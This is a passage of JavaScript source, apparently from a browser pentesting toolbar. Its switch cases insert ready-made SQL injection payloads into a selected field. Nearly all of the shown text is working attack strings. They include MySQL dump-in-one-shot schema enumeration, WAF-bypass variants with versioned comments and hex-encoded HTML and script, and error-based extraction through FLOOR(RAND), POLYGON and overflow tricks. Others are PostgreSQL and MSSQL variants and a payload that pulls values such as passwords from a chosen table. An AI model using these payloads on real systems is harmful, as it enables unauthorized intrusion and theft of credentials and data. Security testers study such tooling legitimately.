  		txt = "(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM("+temtablename+')WHERE(@x)IN(@x:=CONCAT(0x20,@x,'+temcolname+',0x3c62723e))))x)';	
  	}
	else{
  		txt = "(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM("+temdbname+'.'+temtablename+')WHERE(@x)IN(@x:=CONCAT(0x20,@x,'+temcolname+',0x3c62723e))))x)';	
	}
	this.setSelectedText(txt);
	break;

  case "db_madblood":
	txt = "(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))";
	this.setSelectedText(txt);
	break;

  case "db_tpro":
  	var txt=prompt('Database Name','database()');
	txt = "(select (@x)from(select(@x:=0x00),(@NR_TAB:=0),(select (0)from(information_schema.tables)where(table_schema="+Encrypt.strToHex(txt)+')and(0x00)in(@x:=concat(@x,0x3c62723e,0x3c62723e,0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e,@tbl:=table_name,0x202d2d3e205441424c45204e7220,(@NR_TAB:=@NR_TAB%2b1),0x3c2f7370616e3e,0x3c62723e,0x3c62723e,(@NR_COL:=char(0)),0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e434f4c554d53204f46205441424c453c2f7370616e3e3c62723e,(select group_concat((@NR_COL:=@NR_COL%2b1),0x20203a2020,column_name+separator+0x3c62723e)from+information_schema.columns+where+table_schema=Database()+and+table_name=@tbl)))))x)';
	this.setSelectedText(txt);
	break;

  case "db_zen":
	txt = "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)";
	this.setSelectedText(txt);
	break;

  case "db_trojanwaf":
	txt = "concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/";
	this.setSelectedText(txt);
	break;

  case "db_makmanwaf":
	txt = "concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)";
	this.setSelectedText(txt);
	break;

  case "db_madbloodwaf1":
	txt = "export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)";
	this.setSelectedText(txt);
	break;

  case "db_madbloodwaf2":
	txt = "+and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+";
	this.setSelectedText(txt);
	break;

  case "db_trojbenchmark":
	txt = "concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)";
	this.setSelectedText(txt);
	break;

  case "db_rooth3x49":
	txt = "(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b), 0x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select+count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+ifnull(table_rows,0x30)+from+information_schema.tables+where+table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)";
	this.setSelectedText(txt);
	break;

  case "db_replace":
	txt = "replace(replace(replace(0x232425,0x23,@:=replace(replace(replace(replace(0x243c62723e253c62723e3c666f6e7420636f6c6f723d7265643e263c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d707572706c653e273c2f666f6e743e3c666f6e7420636f6c6f723d7265643e,0x24,0x3c62723e3c62723e3c666f6e7420636f6c6f723d626c61636b3e72306f744048335834393c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e),0x25,version()),0x26,database()),0x27,user())),0x24,(select+count(*)+from+%0Ainformation_schema.columns+where+table_schema=database()+and@:=replace(replace(0x003c62723e2a,0x00,@),0x2a,table_name))),0x25,@)";
	this.setSelectedText(txt);
	break;

  case "db_makman":
  	var txt=prompt('Database Name ','database()');
	txt = "(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema="+Encrypt.strToHex(txt)+')and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.columns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)';
	this.setSelectedText(txt);
	break;

  case "db_ajkaro":
	txt = "(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e), 0x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)";
	this.setSelectedText(txt);
	break;

  case "db_zenwaf":
	txt = "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)";
	this.setSelectedText(txt);
	break;

  case "db_waf":
	txt = "(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*) from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))";
	this.setSelectedText(txt);
	break;

  case "db_rummy":
	txt = "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c74723e3c74643e3c666f6e7420636f6c6f723d7265642073697a653d333e266e6273703b266e6273703b266e6273703b,table_schema,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d677265656e2073697a653d333e266e6273703b266e6273703b266e6273703b,table_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75652073697a653d333e,column_name,0x266e6273703b266e6273703b3c2f666f6e743e3c2f74643e3c2f74723e))))x)";
	this.setSelectedText(txt);
	break;

  case "postgre84":
	txt = "(select+array_to_string(array_agg(concat(table_name,'::',column_name)::text),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
	this.setSelectedText(txt);
	break;

  case "postgre91":
	txt = "(select+string_agg(concat(table_name,'::',column_name),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))";
	this.setSelectedText(txt);
	break;

  case "postgreall":
	txt = "(select+array_to_string(array(select+table_name||':::'||column_name::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E'))";
	this.setSelectedText(txt);
	break;

  case "db_rummy_zen":
	txt = ";begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by rummykhan :: '%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into Chall1 END--";
	this.setSelectedText(txt);
	break;

  case "db_names1":
	txt = "(SELECT(@y)FROM(SELECT(@y:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.SCHEMATA)WHERE(SCHEMA_NAME!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461)AND(0x00)IN(@y:=CONCAT(@y,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,schema_name,0x3c62723e))))y)";
	this.setSelectedText(txt);
	break;

  case "db_count1":
	txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.schemata)where(schema_name!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461)and(@)in(@:=concat(@,@x:=@x%2b1))))x)";
	this.setSelectedText(txt);
	break;

  case "pdbtc":
	txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.tables)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)";
	this.setSelectedText(txt);
	break;

  case "pdbcc":
	txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.columns)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)";
	this.setSelectedText(txt);
	break;

  case "idbtc":
	txt = "(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.tables)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)";
	this.setSelectedText(txt);
	break;

  case "icc":
	txt = "(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.columns)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)";
	this.setSelectedText(txt);
	break;

  case "getversion1":
	txt = "+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1";
	this.setSelectedText(txt);
	break;

  case "getdb":
	txt = "+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
	this.setSelectedText(txt);
	break;

  case "gettable1":
  	var txt = prompt('Database Name','DATABASE()');
	txt = "+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema="+Encrypt.strToHex(txt)+"+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
	this.setSelectedText(txt);
	break;

  case "getcolumn1":
  	var temdbname = prompt('Database Name','DATABASE()');
  	var temtablename = prompt('Table Name','users');
	txt = "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name="+Encrypt.strToHex(temtablename)+"+AND+table_schema="+Encrypt.strToHex(temdbname)+"+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
	this.setSelectedText(txt);
	break;

  case "getdata1":
  	var temdbname = prompt('Database Name','DATABASE()');
  	var temtablename = prompt('Table Name','users');
  	var temcolname = prompt('Column Name','password');
  	
  	if (!temdbname.localeCompare('DATABASE()')) {
  		txt = "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT("+temcolname+")+AS+CHAR),0x7e))+FROM+"+temtablename+"+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";	
  	}
	else{
  		txt = "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT("+temcolname+")+AS+CHAR),0x7e))+FROM+"+temdbname+'.'+temtablename+"+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";	
	}
	this.setSelectedText(txt);
	break;

  case "getversion2":
	txt = "+POLYGON((select*from(select*from(select+concat(@@version)f)x))";
	this.setSelectedText(txt);
	break;

  case "gettable2":
	txt = "+POLYGON((select*from(select*from(select+group_concat(table_name+separator+0x3c62723e)+from+information_schema.tables+where+table_schema=database())f)x))";
	this.setSelectedText(txt);
	break;

  case "dios11":
	txt = "+multipoint((select*from+(select+x*1E308+from+(select+concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@)x)y)j))";
	this.setSelectedText(txt);
	break;

  case "dios12":
	txt = "+multipoint((select*from(select(!x-~0)+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)j))";
	this.setSelectedText(txt);
	break;

  case "dios13":
	txt = "multipoint((select*from(select(x+is+not+null)-9223372036854775808+from+(select(concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@))x)y)j))";
	this.setSelectedText(txt);
	break;

  case "dios14":
	txt = "'+and+multipoint((select*from(select!x-~0.from(select(select+group_concat(table_name+separator+0x0b)from(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,20)c)x)j)h))";
	this.setSelectedText(txt);
	break;

  case "getversion3":
	txt = "and(select!x-~0.+from(select(select+group_concat(Version()))x)x)";
	this.setSelectedText(txt);
	break;

  case "gettable3":
	txt = "and(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
	this.setSelectedText(txt);
	break;

  case "dios21":
	txt = "(select+x*1E308+from(select+concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@)x)y)";
	this.setSelectedText(txt);
	break;

  case "dios22":
	txt = "(select(x+is+not+null)-9223372036854775808+from(select(concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@))x)y)";
	this.setSelectedText(txt);
	break;

  case "dios23":
	txt = "(select!x-~0+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)";
	this.setSelectedText(txt);
	break;

  case "dios24":
	txt = "(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
	this.setSelectedText(txt);
	break;

  case "dios25":
	txt = "(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
	this.setSelectedText(txt);
	break;

  case "dios26":
	txt = "(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
	this.setSelectedText(txt);
	break;

  case "dios27":
	txt = "and(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
	this.setSelectedText(txt);
	break;

  case "dios28":
	txt = "and(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
	this.setSelectedText(txt);
	break;

  case "dios29":
	txt = "and(select+x*1E308+from(select+concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@)x)y)";
	this.setSelectedText(txt);
	break;

  case "getversion4":
	txt = "+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+CONCAT(CAST(VERSION()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
	this.setSelectedText(txt);
	break;

  case "getdb2":
	txt = "+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(schema_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.SCHEMATA+WHERE+table_schema!=DATABASE()+LIMIT+1,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),+FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
	this.setSelectedText(txt);
	break;

  case "gettable4":
    var txt = prompt('Database Name','DATABASE()');
	txt = "+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(table_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=" + Encrypt.strToHex(txt)+"+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
	this.setSelectedText(txt);
	break;

  case "getcolumn2":
  	var temdbname = prompt('Database Name','DATABASE()');
  	var temtablename = prompt('Table Name','users');
